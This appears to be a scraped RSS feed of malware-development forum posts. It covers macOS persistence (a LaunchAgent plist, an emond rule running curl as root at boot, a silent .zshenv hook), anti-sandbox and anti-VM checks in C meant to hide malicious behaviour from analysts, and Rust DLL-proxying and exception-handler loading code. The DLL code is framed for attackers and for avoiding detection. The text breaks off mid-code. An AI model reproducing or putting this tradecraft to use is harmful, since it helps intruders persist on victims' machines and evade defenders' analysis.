<p>I hope you’ve learned something from this simple introduction, and there’s a lot more to explore beyond what we’ve touched on here. All the code used here can be found at <a href="https://github.com/0xf00sec/OSX-Injection" rel="noopener nofollow ugc">Github</a></p>
<h1><a name="persistence-11" class="anchor" href="https://0x00sec.org#persistence-11"></a>Persistence</h1>
<p>Alright, let’s discuss <em>persistence</em>. It’s a crucial step once we’ve gained initial access and understood the situation. Typically, we aim to establish some form of persistence. We don’t want to rely solely on that initial access point because it could be terminated for various reasons. There might be issues with the user’s computer, or the target could decide to shut everything down. So, it’s important to have a method in place to maintain access to the target.</p>
<p>While there are several persistence techniques for MacOS systems, many of them require root privileges to perform, or exploit some sort of low-level vulnerability to escalate. To keep things simple, let’s focus on Userland Persistence. First, I’ll describe some well-known persistence techniques and some lesser-known ones, so you can understand how these techniques work and how malware can use them. Alright, let’s go :</p>
<p>Before I began writing this article, I analyzed some samples targeting macOS and read some threat reports. One commonality among them is that launch agents and launch daemons are by far the most prevalent methods of persistence. Why, you might ask? Well, it’s because of their simplicity and flexibility. You could liken them to the startup folder persistence equivalent on Windows. However, detecting such techniques is relatively easy. Remember when we mentioned LOLBins? Well, think of it as a similarly straightforward and common method, and the detection methods are also well-known.</p>
<h2><a name="launchagent-launchdaemon-12" class="anchor" href="https://0x00sec.org#launchagent-launchdaemon-12"></a>LaunchAgent &amp; LaunchDaemon</h2>
<p>LaunchAgents and LaunchDaemons are key components of macOS, responsible for managing processes automatically. LaunchAgents are typically located in the <code>~/Library/LaunchAgents</code> directory for user-specific tasks, triggering actions when a user logs in. On the flip side, LaunchDaemons are situated in <code>/Library/LaunchDaemons</code>, initiating tasks upon system startup.</p>
<p>Although LaunchAgents primarily operate within user sessions, they can also be found in system directories like <code>/System/Library/LaunchAgents</code>. However, modifying these files would require disabling System Integrity Protection (SIP), which is not recommended due to potential security risks. In contrast, LaunchDaemons, operating at a system level, require administrator privileges for installation and typically reside in <code>/Library/LaunchDaemons</code>.</p>
<p>Both LaunchAgents and LaunchDaemons are configured using <code>.plist</code> files, specifying commands or referencing executable files for execution.</p>
<p>LaunchAgents are suitable for tasks requiring user interaction, while LaunchDaemons are better suited for background processes. Let’s take a LaunchAgents example:</p>
<pre><code class="lang-auto">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.pre.foo.plist&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/foo/dummy&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>So, what does this all mean? Basically, when we want our binary to run every time a user logs onto the system, we just tell launchd to handle it. It’s pretty straightforward, right? But here’s where it gets interesting: there’s something called <code>emond</code>, a command native to macOS located at <code>/sbin/emond</code>. This little tool is quite handy; it accepts events from various services, processes them through a simple rules engine, and takes action accordingly. These actions can involve running commands or performing other tasks.</p>
<p>Now, <code>emond</code> isn’t just any ordinary command. It functions as a regular daemon and is kicked off by launchd every time the operating system starts up. Its configuration file, where we set when and how <code>emond</code> runs, hangs out with the other system daemons at <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.</p>
<p>But how can we use this event monitoring daemon to establish persistence? Well, the mechanics of <code>emond</code> are pretty much like any other LaunchDaemon. It’s launchd’s job to fire up all the LaunchDaemons and LaunchAgents during the boot process. Since <code>emond</code> starts up during boot, if you’re using the <code>_run command_</code> action, you need to be mindful of what command you’re executing and when during the boot process it’ll happen.</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;array&gt;
    &lt;dict&gt;
        &lt;key&gt;name&lt;/key&gt;
        &lt;string&gt;foo&lt;/string&gt;
        &lt;key&gt;enabled&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;eventTypes&lt;/key&gt;
        &lt;array&gt;
            &lt;string&gt;startup&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;actions&lt;/key&gt;
        &lt;array&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;sleep&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;10&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;curl&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;dns.log&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
        &lt;/array&gt;
    &lt;/dict&gt;
&lt;/array&gt;
&lt;/plist&gt;
</code></pre>
<p>So, in our <strong>SampleRules.plist</strong> file, we have a setup called ‘foo’. First off, it waits for 10 seconds after startup. This is done using a command called <code>sleep</code>. Next, we use <code>curl</code> to simply send a DNS query record to verify that it’s actually working, and once the service has started, your event will immediately fire and trigger any actions. <code>emond</code> isn’t a new way to monitor events on macOS, but it’s considered innovative when used for offensive purposes.</p>
<h2><a name="bash-profiles-zsh-startup-13" class="anchor" href="https://0x00sec.org#bash-profiles-zsh-startup-13"></a>Bash Profiles &amp; Zsh Startup</h2>
<p>Let’s talk about those bash profiles on Linux systems. They’re essentially scripts containing commands that run whenever you open up a terminal, Instead of bash profiles, zsh has its own version called start files, which serve the same purpose. But here’s the twist: zsh also comes with an extra file called the zsh environment file. This file is more powerful because it kicks in more often, ensuring persistence across different interactions with zsh.</p>
<p>The cool thing is that even if you just type in a command like <code>zsh -c</code>, this shell environment file still gets sourced. This means your persistence setup remains strong, no matter how you’re using shell.</p>
<pre><code class="lang-sh">~ &gt; cat .zshenv
. "/Users/foo/startup.sh" &gt; /dev/null 2&gt;&amp;1&amp;
</code></pre>
<p>Now, every time you open a terminal and Z shell initializes, it will automatically execute the <code>startup.sh</code> script, ensuring that your desired commands or actions are performed consistently.</p>
<p><img src="https://0xf00sec.github.io/images/IMG7.png" width="592" height="257"> </p>
<p>Now, to execute it in the background, we use <code>setopt NO_MONITOR</code>. This command disables job monitoring and then runs the <code>startup.sh</code> script in the background. As a result, the script runs every time you open a terminal with Z shell, but it runs silently in the background.</p>
<p>So, you get the gist of it, right? These are some of the known techniques I’ve come across, especially in samples. There’s more like Cron jobs, Dock shortcuts, and more. But to be honest, if I were to write specifically for macOS, I’d go multi-stage and avoid any known techniques out there. Simply put, once a technique is made public, it’s burned. So , I’ll focus more on developing something that has a longer lifespan.</p>
<p>Nowadays, with all the public scripts and post-exploitation frameworks out there, attackers try to get the job done easily without wasting time or energy. Writing malware takes time and energy, so they aim for low-hanging fruit that’s just acceptable for a malware author. Because once the malware is burned, it’s burned. But if it’s a long-term operation, it takes time and skill to put together, and you can’t risk the malware getting burned by the first few infection. But for a red team exercise, for example, you’d test low-hanging fruit and an easy way to get in before emulating advance threats.</p>
<p>Also, a skilled attacker can get past most security setups with just a simple MSFvenom shellcode. Yep, so at the end, it comes down to the simplest attacks. Usually, at this point in the article, I’ve added a section for writing a simple malware, where we take all that we’ve covered and put it into one malware(rootkit). However, considering some thought, adding more code might just make things drag on and get confusing. We can save that for another article where we can really dive into the whole process because rootkits are quite advanced pieces of code and require knowledge about the kernel and low-level system programming. Since we just covered the surface here, I don’t think a rootkit would be a match for this article; it needs its own article.</p>
<p>But hey, since we’ve already covered code injection pretty extensively, we’ll get into the fancy stuff later.</p>
<h1><a name="conclusion-14" class="anchor" href="https://0x00sec.org#conclusion-14"></a>Conclusion</h1>
<p>In conclusion, I hope that you’ve enjoyed and learned something from this article. We’ve covered a broad array of topics related to the macOS architecture and API, although we’ve only scratched the surface. By delving into techniques and writing simple code using the Mach API, we’ve gained a deeper understanding of the environment, its features, and its security. We’ve covered fundamental concepts like code injection and simple persistence techniques, and we’ve even seen macOS syscalls in action through examples. Until next time.</p>
<h2><a name="references-15" class="anchor" href="https://0x00sec.org#references-15"></a>References</h2>
<ul>
<li><a href="https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/IOService/IOService.html#//apple_ref/doc/uid/TP30000697-TPXREF101" rel="noopener nofollow ugc">I/O Kit Fundamentals</a></li>
<li><a href="https://developer.apple.com/library/archive/navigation/#section=Platforms&amp;topic=macOS" rel="noopener nofollow ugc">macOS - Apple Developer</a></li>
<li><a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html" rel="noopener nofollow ugc">Code Injection on macOS</a></li>
<li><a href="https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/" rel="noopener nofollow ugc">Simple Code Injection</a></li>
<li><a href="http://www.idryman.org/blog/2014/12/02/writing-64-bit-assembly-on-mac-os-x/" rel="noopener nofollow ugc">Writing 64-bit Assembly on Mac OS X</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Architecture/Architecture.html#//apple_ref/doc/uid/TP30000905-CH1g-CACDAEDC" rel="noopener nofollow ugc">Architecture of the Kernel - Darwin</a></li>
</ul>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/macos-malware-development/39443">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/macos-malware-development/39443</link>
          <pubDate>Sat, 09 Mar 2024 02:01:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39443</guid>
          <source url="https://0x00sec.org/t/macos-malware-development/39443.rss">macOS Malware Development</source>
        </item>
        <item>
          <title>Secure Browsing Habits</title>
          <dc:creator><![CDATA[hjishbfhuwebf]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi,</p>
<p>So, I’m fairly certain I know the answer to this, but I like to take the naiv approach.</p>
<p>Assuming there are no 0-days involved, can any Malware be run on a computer(any os) by visiting arbitiary websites and downloading arbitiary files WITHOUT actually opening/running the Downloaded files.</p>
<p>Again, not refering to watering-hole attacks, 0-days, or anything unpatched.</p>
<p>Thanks for any Answers!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/secure-browsing-habits/39344">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/secure-browsing-habits/39344</link>
          <pubDate>Fri, 01 Mar 2024 19:16:20 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39344</guid>
          <source url="https://0x00sec.org/t/secure-browsing-habits/39344.rss">Secure Browsing Habits</source>
        </item>
        <item>
          <title>Malware development lesson plan for this month</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p><a href="https://twitter.com/blc_chef/status/1763337789465383001/photo/1" class="onebox" target="_blank" rel="noopener nofollow ugc">https://twitter.com/blc_chef/status/1763337789465383001/photo/1</a></p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328</link>
          <pubDate>Fri, 01 Mar 2024 00:52:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39328</guid>
          <source url="https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328.rss">Malware development lesson plan for this month</source>
        </item>
        <item>
          <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>malware development | anti-sandbox | anti-VM techniques in c</p>
<p>video out now but thanks for subscribing</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg">
  <header class="source">
      <img src="https://www.youtube.com/s/desktop/fe730087/img/favicon.ico" class="site-icon" width="16" height="16">

      <a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">YouTube</a>
  </header>

  <article class="onebox-body">
    <img src="https://yt3.googleusercontent.com/zMeNKZunaI4ML_acQo1UW-qYDMmBIrIkRl4sxTb_aiPk_d5vnFyGiPMzakSXubw7QZzlKNPmtg=s900-c-k-c0x00ffffff-no-rj" class="thumbnail onebox-avatar" width="500" height="500">

<h3><a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">lnl training consult</a></h3>

  <p>Welcome to our YouTube channel, where we offer an extensive range of courses focused on malware development, reverse engineering, low-level security, programming, and much more. Our channel is dedicated to providing top-rated educational content that...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Analyzing a malwareapp dynamically</p>
<p>Dynamic analysis of an executable may be performed either automatically by a sandbox or manually by a malware  analyst. Malicious applications often use various methods to finger print the environment they’re being executed in and perform different actions based on a given execution environment situation.</p>
<p>Automated analysis is performed in a simplified sandbox environment which may have some specific traits;  particularly it may not be able to emulate all execution nuances of  a real environment.</p>
<p>Both automated and manual analysis have common characteristics, in particular they are usually performed in virtual environments which can be easily detected if not configured properly.</p>
<p>Most sandbox detection techniques revolve around checking specific environment attributes</p>
<p>Example<br>
limited resources, indicative device names  artifacts ,presence of specific files, registry keys</p>
<p>Detecting virtual environments</p>
<p>Both sandboxes and analyst’s virtual Operating Systems usually can’t 100% emulate actual execution environment like typical user workstations). Virtual environments have limited resources ,corresponding device names whch  can also provide useful information, may have VM-specific tools and drivers installed, often look like  fresh Windows installations and sometimes use hardcoded user or computer names.</p>
<p>Hardware resources information retrieval<br>
sandboxes /VM boxes used by analysts are  subjected  to some constraints - they often have limited resources.</p>
<p>Typical user workstation have  processors with at least 2 cores, a minimum of 2 GB of RAM and a 100 GB hard drive space. We can verify if the environment our malicious application is being executed in is a subject to these constrains:</p>
<p>// check CPU<br>
SYSTEM_INFO systemInfo;<br>
GetSystemInfo(&amp;systemInfo);<br>
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;<br>
if (numberOfProcessors &lt; 2) return false;</p>
<p>// check RAM<br>
MEMORYSTATUSEX memoryStatus;<br>
memoryStatus.dwLength = sizeof(memoryStatus);<br>
GlobalMemoryStatusEx(&amp;memoryStatus);<br>
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;<br>
if (RAMMB &lt; 2048) return false;</p>
<p>// check HDD</p>
<p>HANDLE hDevice = CreateFileW(L"\\.\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</p>
<p>DISK_GEOMETRY pDiskGeometry;</p>
<p>DWORD bytesReturned;</p>
<p>DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0,&amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</p>
<p>DWORD diskSizeGB;</p>
<p>diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;</p>
<p>if (diskSizeGB &lt; 100) return false;</p>
<p>Devices and vendor names</p>
<p>On default VM installations, devices often have predictable names, for example containing strings associated with the specific hypervisor. We can check for hard drive name, optical disk drive name, BIOS version, computer manufacturer and model name, graphics controller name etc. Relevant information can be retrieved with WMI queries (check properties like “Name”, “Description”, “Caption”).</p>
<p>Below you can see an example of HDD name retrieval using native Windows API functions (without WMI):</p>
<p>HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);</p>
<p>SP_DEVINFO_DATA deviceInfoData;</p>
<p>deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);</p>
<p>SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);</p>
<p>DWORD propertyBufferSize;</p>
<p>SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);</p>
<p>PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);</p>
<p>CharUpperW(HDDName);</p>
<p>if (wcsstr(HDDName, L"VBOX")) return false;</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326</link>
          <pubDate>Thu, 29 Feb 2024 23:32:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39326</guid>
          <source url="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss">Malware development | anti-sandbox | anti-VM techniques in c</source>
        </item>
        <item>
          <title>Unlock the Secrets of Malware Development: Comprehensive Course</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi my fellow members am proud to tell that the promised malware development course is out now,<br>
its 5 hours straight and it begins with the basics to advanced staff and this is part 1<br>
it’s the biggest malware development on the internet<br>
The link to the channel</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg">
  <header class="source">
      <img src="https://www.youtube.com/s/desktop/d133835b/img/favicon.ico" class="site-icon" width="16" height="16">

      <a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">YouTube</a>
  </header>

  <article class="onebox-body">
    <img src="https://yt3.googleusercontent.com/zMeNKZunaI4ML_acQo1UW-qYDMmBIrIkRl4sxTb_aiPk_d5vnFyGiPMzakSXubw7QZzlKNPmtg=s900-c-k-c0x00ffffff-no-rj" class="thumbnail onebox-avatar" width="500" height="500">

<h3><a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">lnl training consult</a></h3>

  <p>Welcome to our YouTube channel, where we offer an extensive range of courses focused on malware development, reverse engineering, low-level security, programming, and much more. Our channel is dedicated to providing top-rated educational content that...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Admins, IT personnel, malware developers, hackers please am kindly requesting for your support, i need to reach 1000 subscribers but i cant do it without you guys, am doing everything and have done everything because of your support so please support me by going to my channel and subscribe<br>
BECAUSE WE ARE A COMMUNITY OF SUPPORTIVE INDIVIDUALS SO PLEASE SUPPORT YOUR OWN.<br>
Hackers  its your time to support me</p>
<p>Subscribe, share and like just that<br>
Subscribe please to make the channel grow</p>
            <p><small>9 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072</link>
          <pubDate>Thu, 08 Feb 2024 22:21:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39072</guid>
          <source url="https://0x00sec.org/t/unlock-the-secrets-of-malware-development-comprehensive-course/39072.rss">Unlock the Secrets of Malware Development: Comprehensive Course</source>
        </item>
        <item>
          <title>DLL-Load Proxying</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this post we’ll focus on the theory of a technique known as DLL Proxying, I already have post covers <a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769">Malware Development Essentials</a> going over some techniques and examples, Check it out,</p>
<p>So What the hell is “DLL Proxying”,</p>
<p>DLL Proxying is a technique in which an attacker replaces a Dynamic Link Library (DLL) with a malicious version, opting to rename the original DLL rather than deleting it. The malicious DLL is designed to exclusively implement the functions targeted for interception or modification by the attacker. Meanwhile, all other functions are forwarded to the original DLL, earning the name “Proxy” for this approach. This method allows the attacker to essentially act as a middleman, intercepting and modifying only the specific functions of interest, while seamlessly forwarding the remaining functions to the original DLL. By doing so, the attacker minimizes the amount of effort required, ensuring that overall functionality is maintained without disruption. This technique is particularly effective for carrying out specific attacks while avoiding unnecessary complications or detection.</p>
<h1><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<p>Recently, I’ve been exploring Rust and its offensive capabilities. So I thought DLL-load proxying in Rust. However, before delving into the implementation, Let’s discuss the potential effectiveness of DLL Proxy loading for malicious actors. Let’s examine this example more closely.</p>
<pre><code class="lang-auto">  Application (A)
      |
      +-- Loads "some.dll" (B)
            |
            +-- Executes "Data()" (C)

</code></pre>
<p>In the typical flow, when a DLL is loaded, the system follows a standard process. However, when executing DLL Proxy loading, the flow diverges from the usual path. In this process, a malicious actor creates a deceptive proxy DLL designed to mimic the legitimate “foo.dll.” Unbeknownst to the application, it loads this proxy DLL, assuming it to be the authentic version. The proxy DLL intercepts and redirects function calls to the real “foo_Original.dll.” While facilitating the intended functionality, the proxy DLL concurrently executes covert malicious code, effectively seizing control of the application’s execution flow without the user’s or application’s knowledge.</p>
<p>See,</p>
<pre><code class="lang-auto">  Application (A)
      |
      +-- Loads malicious "foo.dll" (C) - Attacker's Proxy DLL
            |
            +-- Intercepts and redirects calls to "foo_Original.dll" (B)
            |      |
            |      +-- Executes "Data()" (D) from the original DLL
            |      |
            |      +-- Executes additional malicious code (E)
            |
            +-- Application runs with hijacked execution flow

</code></pre>
<p>Implementing DLL proxying for a DLL with numerous exported functions can be laborious. Fortunately, there are tools available to automate this process, such as <a href="https://github.com/Flangvik/SharpDllProxy/" rel="noopener nofollow ugc">SharpDllProxy</a>. This tool generates the Proxy DLL source code based on the extracted functions from the original DLL. The resulting source code simply reads a file into memory and then invokes it within a new thread. This automation streamlines the implementation of DLL proxying, making it more accessible for malicious actors.</p>
<p>Now that we have a high-level overview of how DLL proxying works, Let’s build a legit DLL,  Let’s call it <code>o_foo.dll</code></p>
<pre><code class="lang-rust">use winapi::um::winuser::MessageBoxA;

#[no_mangle]
pub unsafe extern "C" fn legitfunction() {
    let message = "Hello!\0";
    let title = "foo\0";

    MessageBoxA(
        std::ptr::null_mut(),
        message.as_ptr() as *const i8,
        title.as_ptr() as *const i8,
        0,
    );
}
</code></pre>
<p>Now this is simple when this DLL is executed, it shows a message box with the text “Hello!” and the title “foo” on the user’s screen. Additionally, the <code>cargo build --release</code> output is stored in the sample location. Conversely, for DLL proxying, we reroute the execution of a function named <code>legitfunction</code> from one DLL to another, specifically <code>o_foo.dll</code>.  This requires integrating the function into a new (DLL), featuring a <code>DllMain</code> function as the entry point for DLLs.</p>
<pre><code class="lang-rust">use forward_dll;
use winapi::um::winuser::MessageBoxA;

forward_dll::forward_dll!(
    r#"C:\Users\foo\rs\o_foo.dll"#, 
    DLL_VERSION_FORWARDER,
    legitfunction
);

#[no_mangle]
pub unsafe extern "C" fn DllMain(instance: isize, reason: u32, reserved: *const u8) -&gt; u32 {
    if reason == 1 {
        // Display a message box to indicate the DLL is loaded
        MessageBoxA(
            std::ptr::null_mut(),
            "Malicious DLL loaded!\0".as_ptr() as *const i8,
            "foo\0".as_ptr() as *const i8,
            0,
        );

        // Forward the legitfunction from the other DLL
        let _ = DLL_VERSION_FORWARDER.forward_all();

        // Return success
        return 1;
    }
    1
}

</code></pre>
<p>When the DLL is loaded, a message box is displayed to indicate that the DLL has been successfully loaded.</p>
<h2><a name="veh-3" class="anchor" href="https://0x00sec.org#veh-3"></a>VEH</h2>
<p>Ok, Let’s dive into a technique that demonstrates dynamic DLL loading and exception handling using a Vectored Exception Handler (VEH). The goal here is to load a DLL and execute specific operations within the context of an exception, utilizing a guard page violation as a trigger for the exception handler. Vectored Exception Handlers extend Structured Exception Handling on Windows and operate independently of the call stack. VEH will be invoked for unhandled exceptions, irrespective of their location. You can find more information on Vectored Exception Handling in the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling" class="inline-onebox" rel="noopener nofollow ugc">Vectored Exception Handling - Win32 apps | Microsoft Learn</a></p>
<ul>
<li>Loads a DLL with a proxied exception handler.</li>
<li>Triggers the VEH by setting a guard page.</li>
<li>Unloads the library.</li>
</ul>
<p>In the implementation stage, we need to establish the necessary steps for dynamically loading a DLL, installing a Vectored Exception Handler (VEH), and defining a custom exception handler tailored for guard page violations. The Vectored Exception Handler (VEH) will be utilized to manipulate the context, specifically modifying the RIP register to redirect execution to <code>LoadLibraryA</code>, and the RCX register to store the function’s argument (module name) for <code>LoadLibraryA</code>. To trigger our exception, VirtualProtect is employed to set the page to <code>PAGE_GUARD</code>, leading to a <code>STATUS_GUARD_PAGE_VIOLATION</code>.</p>
<p>We set up a Vectored Exception Handler (<code>VectoredExceptionHandler</code>) to manage guard page violations and dynamically load the <code>foo.dll</code> DLL using the <code>LoadLibraryA</code> function. This intricate setup ensures that we can control the loading process and execute specific operations within the context of the exception.</p>
<p>The VEH is designed to dynamically load a DLL (<code>kernel32.dll</code>) when such an exception occurs, to leverage a guard page violation exception as a trigger to dynamically load a DLL (<code>kernel32.dll</code>) and execute the <code>LoadLibraryA</code> function. By modifying the registers within the exception context, the code redirects the execution flow to load a specific DLL dynamically during runtime, providing a level of control over the process’s behavior.</p>
<pre><code class="lang-rust">unsafe extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -&gt; i32 {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_record = (*exception_info).as_ref().and_then(|info| info.ExceptionRecord);
    if exception_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_code = exception_record.unwrap().ExceptionCode;
    if exception_code != winapi::shared::ntdef::STATUS_GUARD_PAGE_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context_record = (*exception_info).as_mut().and_then(|info| info.ContextRecord);
    if context_record.is_none() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let kernel32_module = GetModuleHandleA(CString::new("kernel32.dll").unwrap().as_ptr());
    if kernel32_module.is_null() {
        eprintln!("Failed to get handle for kernel32.dll");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let load_library_addr = GetProcAddress(kernel32_module, CString::new("LoadLibraryA").unwrap().as_ptr()) as usize;
    if load_library_addr == 0 {
        eprintln!("Failed to get address for LoadLibraryA");
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip_address = (*(*exception_info).as_mut().unwrap().ContextRecord).Rip as usize;
    let load_library_call_address = rip_address - (rip_address - load_library_addr) % 5;

    (*(*exception_info).as_mut().unwrap().ContextRecord).Rip = load_library_call_address as u64;
    (*(*exception_info).as_mut().unwrap().ContextRecord).Rcx = MODULE_NAME.as_ptr() as u64;

    EXCEPTION_CONTINUE_EXECUTION
}
</code></pre>
<p>The initial step involves obtaining the module handle of <code>kernel32.dll</code> and determining the address of the <code>LoadLibraryA</code> function within it. <code>LoadLibraryA</code> is a Windows API function responsible for loading dynamic link libraries (DLLs). Subsequently, the implementation calculates a dynamic address for the <code>LoadLibraryA</code> call based on the current instruction pointer (<code>Rip</code>). After obtaining this dynamic address, it modifies the instruction pointer (<code>Rip</code>) to point to the dynamically calculated address for the <code>LoadLibraryA</code> call. Simultaneously, it sets the RCX register to the address of the DLL name (<code>foo.dll</code>).</p>
<p>For Opsec, storing the <code>LoadLibraryA</code> address directly on the stack might expose a static pattern, making it susceptible to identification through static analysis. By dynamically calculating the address and avoiding a direct push to the stack, the injection technique becomes less predictable and more challenging to detect. This avoidance of direct storage on the stack, coupled with dynamic loading of DLLs and runtime calculation of function addresses, increases the overall unpredictability.</p>
<pre><code class="lang-rust">
fn proxied_load_library(module_name: &amp;str) -&gt; Option&lt;winapi::um::libloaderapi::HMODULE&gt; {
    unsafe {
        let handler = AddVectoredExceptionHandler(1, Some(vectored_exception_handler));
